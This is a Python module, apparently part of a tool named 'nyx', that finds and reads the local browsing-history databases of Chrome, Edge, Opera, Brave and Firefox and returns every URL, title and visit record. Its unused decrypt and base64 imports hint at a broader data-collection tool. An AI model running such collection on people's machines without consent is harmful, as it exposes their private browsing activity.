# nyx/modules/browser_history.py
import os
import sqlite3
import json
import base64
from nyx.utils import decrypt, logger
from config import ALLOWED_EXTENSIONS

def extract_browser_history():
    histories = {}
    browsers = {
        "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
        "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
        "Opera": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\History"),
        "Brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
        "Firefox": os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles"),
    }

    for browser, db_path in browsers.items():
        if browser in ["Chrome", "Edge", "Opera", "Brave"]:
            if os.path.exists(db_path):
                try:
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    query = """SELECT url, title, visit_count, last_visit_time FROM urls"""
                    cursor.execute(query)
                    histories[browser] = cursor.fetchall()
                    conn.close()
                    display_message(f"✅ Browser History Updated for {browser}.")
                except Exception as e:
                    display_message(f"❌ Error Updating {browser} history: {e}", "error")
            else:
                display_message(f"❌ {browser} History Database Not Found. It may not be installed.", "warning")
        elif browser == "Firefox":
            if os.path.exists(db_path):
                profiles = [
                    d for d in os.listdir(db_path)
                    if d.endswith(".default-release") or d.endswith(".default")
                ]
                if not profiles:
                    display_message(f"❌ No Firefox profiles found in: {db_path}", "error")
                    continue

                for profile in profiles:
                    history_path = os.path.join(db_path, profile, "places.sqlite")
                    if os.path.exists(history_path):
                        try:
                            conn = sqlite3.connect(history_path)
                            cursor = conn.cursor()
                            query = """SELECT url, title, visit_count, last_visit_date FROM moz_places"""
                            cursor.execute(query)
                            histories.setdefault("Firefox", []).extend(cursor.fetchall())
                            conn.close()
                            display_message(f"✅ Firefox History Updated.")
                        except Exception as e:
                            display_message(f"❌ Error Updating Firefox history: {e}", "error")
                    else:
                        display_message(f"❌ Firefox history not found in profile: {profile}", "warning")
            else:
                display_message(f"❌ Firefox Profiles Directory Not Found. It may not be installed.", "warning")

    if not histories:
        display_message("⚠️ No browser histories were found for the installed browsers.", "warning")

    return histories

def display_message(message, level="info"):
    if level == "info":
        print(f"[+] {message}")
    elif level == "warning":
        print(f"[!] {message}")
    elif level == "error":
        print(f"[-] {message}")
